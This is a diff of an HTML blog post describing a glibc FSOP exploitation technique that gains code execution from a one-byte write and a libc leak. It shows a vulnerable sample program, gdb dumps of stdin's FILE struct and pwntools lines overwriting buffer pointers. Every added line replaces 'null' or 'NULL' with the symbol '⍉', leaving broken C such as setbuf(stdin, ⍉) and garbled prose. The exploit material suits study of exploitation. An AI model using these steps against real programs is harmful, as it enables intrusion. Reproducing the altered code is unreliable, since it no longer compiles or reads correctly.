@@ -19,9 +19,9 @@
       <p>Hi all, shorter post. Today I will be documenting a cool FSOP technique that only requires one-byte write + a leak to gain RCE. I have not done my due diligence in testing these with different versions, but I have confirmed this to work on <span class='monospace'>2.39</span>. There are a handful of prerequisites.</p>
 
       <ol>
-        <li>stdin buffering must be disabled, this is performed with a <span class='monospace'>setbuf(NULL)</span> call.</li>
+        <li>stdin buffering must be disabled, this is performed with a <span class='monospace'>setbuf(stdin, ⍉)</span> call.</li>
         <li>stdio functions must be called at some point in time, such as <span class='monospace'>fgets</span>, <span class='monospace'>puts</span>, so on.</li>
-        <li>At least one byte write to any address of your choosing (null-terminated / newline terminated writes will add difficulty).</li>
+        <li>At least one byte write to any address of your choosing (⍉-terminated / newline terminated writes will add difficulty).</li>
         <li>A libc leak.</li>
       </ol>
 
@@ -80,9 +80,9 @@
 </span><span style="color:#6e7781">   2   </span><span style="color:#cf222e">#include</span><span style="color:#1f2328"> </span><span style="color:#0a3069">&lt;unistd.h&gt;</span><span style="color:#1f2328">
 </span><span style="color:#6e7781">   3   </span><span style="color:#1f2328">
 </span><span style="color:#6e7781">   4   </span><span style="color:#cf222e">int</span><span style="color:#1f2328"> </span><span style="color:#6639ba">main</span><span style="color:#1f2328">(</span><span style="color:#cf222e">void</span><span style="color:#1f2328">)</span><span style="color:#1f2328"> </span><span style="color:#1f2328">{</span><span style="color:#1f2328">
-</span><span style="color:#6e7781">   5   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">setbuf</span><span style="color:#1f2328">(</span><span style="color:#0550ae">stdin</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0550ae">NULL</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
-</span><span style="color:#6e7781">   6   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">setbuf</span><span style="color:#1f2328">(</span><span style="color:#0550ae">stdout</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0550ae">NULL</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
-</span><span style="color:#6e7781">   7   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">setbuf</span><span style="color:#1f2328">(</span><span style="color:#0550ae">stderr</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0550ae">NULL</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   5   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">setbuf</span><span style="color:#1f2328">(</span><span style="color:#0550ae">stdin</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0550ae">⍉</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   6   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">setbuf</span><span style="color:#1f2328">(</span><span style="color:#0550ae">stdout</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0550ae">⍉</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   7   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">setbuf</span><span style="color:#1f2328">(</span><span style="color:#0550ae">stderr</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0550ae">⍉</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
 </span><span style="color:#6e7781">   8   │</span><span style="color:#1f2328">
 </span><span style="color:#6e7781">   9   │</span><span style="color:#1f2328"> </span><span style="color:#cf222e">char</span><span style="color:#0550ae">*</span><span style="color:#1f2328"> arbwrite</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
 </span><span style="color:#6e7781">  10   │</span><span style="color:#1f2328"> </span><span style="color:#cf222e">char</span><span style="color:#1f2328"> a</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> b</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
@@ -101,7 +101,7 @@
 
       <p>The example challenge provides a libc leak for free and then lets us write a single byte of our choosing to any address. After that, it spins in a 'menu loop' that gets input from stdin and prints it out to stdout, this loop is used to flush our buffers so the IO functions successfully trigger. Let's step through the exploit step by step.</p>
 
-      <p>First step is the null byte overwrite.</p>
+      <p>First step is the ⍉ byte overwrite.</p>
 
       <pre><code><span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">gef&gt; </span>p *stdin
 <span style="color:#0550ae">$3</span> = {
@@ -125,7 +125,7 @@
 <span style="color:#cf222e">0x7f9293e03960</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+128&gt;:    0x0     0x7f9293e05720
 <span style="color:#cf222e">0x7f9293e03970</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+144&gt;:    0xffffffffffffffff      0x0</code></pre>
 
-      <p>Here, the null byte overwrite has been performed, and we can see that our next write would be relatve to 0x900: this would overwrite the three <span class='monospace'>write</span> fields (which we can null out), and allow us to rewrite <span class='monospace'>buf_base</span> at 0x918 and <span class='monospace'>buf_end</span> at 0x920.</p>
+      <p>Here, the ⍉ byte overwrite has been performed, and we can see that our next write would be relatve to 0x900: this would overwrite the three <span class='monospace'>write</span> fields (which we can ⍉ out), and allow us to rewrite <span class='monospace'>buf_base</span> at 0x918 and <span class='monospace'>buf_end</span> at 0x920.</p>
 
       <p>Continuing onwards into the horrific bowels of libc IO functions, we can see the eventual vtable dispatch that calls a <span class='monospace'>read</span> with the correct variables set (we read from the <span class='monospace'>stdin</span> struct with buf set to <span class='monospace'>stdin + 0x20</span>).</p>
 
@@ -195,7 +195,7 @@
 </span><span style="color:#6e7781">   9   </span><span style="color:#0550ae">input</span><span style="color:#1f2328">(</span><span style="color:#0a3069">'..'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
 </span><span style="color:#6e7781">  10   </span><span style="color:#1f2328">p</span><span style="color:#0550ae">.</span><span style="color:#6639ba">sendafter</span><span style="color:#1f2328">(</span><span style="color:#0a3069">b'&gt;'</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#6639ba">p64</span><span style="color:#1f2328">(</span><span style="color:#1f2328">libc</span><span style="color:#0550ae">.</span><span style="color:#1f2328">sym</span><span style="color:#1f2328">[</span><span style="color:#0a3069">'_IO_2_1_stdin_'</span><span style="color:#1f2328">]</span><span style="color:#1f2328"> </span><span style="color:#0550ae">+</span><span style="color:#1f2328"> </span><span style="color:#0550ae">0x38</span><span style="color:#1f2328">))</span><span style="color:#1f2328"> </span><span style="font-style:italic;color:#1f2328"></span><span style="font-style:italic;color:#6e7781"># buf_base</span><span style="color:#1f2328"></span><span style="color:#1f2328">
 </span><span style="color:#6e7781">  11   </span><span style="color:#1f2328">
-</span><span style="color:#6e7781">  12   </span><span style="color:#0550ae">print</span><span style="color:#1f2328">(</span><span style="color:#0a3069">'2. sending single null byte'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  12   </span><span style="color:#0550ae">print</span><span style="color:#1f2328">(</span><span style="color:#0a3069">'2. sending single ⍉ byte'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
 </span><span style="color:#6e7781">  13   </span><span style="color:#0550ae">input</span><span style="color:#1f2328">(</span><span style="color:#0a3069">'..'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
 </span><span style="color:#6e7781">  14   </span><span style="color:#1f2328">p</span><span style="color:#0550ae">.</span><span style="color:#6639ba">sendafter</span><span style="color:#1f2328">(</span><span style="color:#0a3069">b'&gt;'</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0a3069">b'</span><span style="color:#cf222e">\0</span><span style="color:#0a3069">'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
 </span><span style="color:#6e7781">  15   </span><span style="color:#1f2328">
@@ -283,7 +283,7 @@
 
       <p><span class='monospace'>_IO_SYSREAD</span> is invoked on <span class='monospace'>buf_base</span> and <span class='monospace'>buf_end</span>, with the length being dynamically calculated from their difference. Forgive me if the following observations are obvious:</p>
 
-      <p>In regular functioning, let's say, stdin is allocated an 0x100 sized buffer. When we call <span class='monospace'>getc()</span> or <span class='monospace'>fgets(0x10)</span> or what-not more input is provided than immediately asked for, the lone read syscall consumes 0x100 bytes of that and stores it, such that the expensive read() syscalls are not always performed repeatedly. This is, obviously, the... entire fucking point of this whole input/output filestream nonsense, and our null-byte overwrite is merely an unintended consequence of very intended behaviour. It is like poetry, it rhymes, it echoes.</p>
+      <p>In regular functioning, let's say, stdin is allocated an 0x100 sized buffer. When we call <span class='monospace'>getc()</span> or <span class='monospace'>fgets(0x10)</span> or what-not more input is provided than immediately asked for, the lone read syscall consumes 0x100 bytes of that and stores it, such that the expensive read() syscalls are not always performed repeatedly. This is, obviously, the... entire fucking point of this whole input/output filestream nonsense, and our ⍉-byte overwrite is merely an unintended consequence of very intended behaviour. It is like poetry, it rhymes, it echoes.</p>
 
       <p>Ok, I have nothing else to add. I was going to write more, but I realized this specific aspect of libc filestream internals are actually quite intuitive and not all that arcane, so not a lot to explain. I hope this was interesting to you, and I hope this exploitation technique proves to be as useful for you as it has been for me many different times. I think it is very powerful!</p>
 
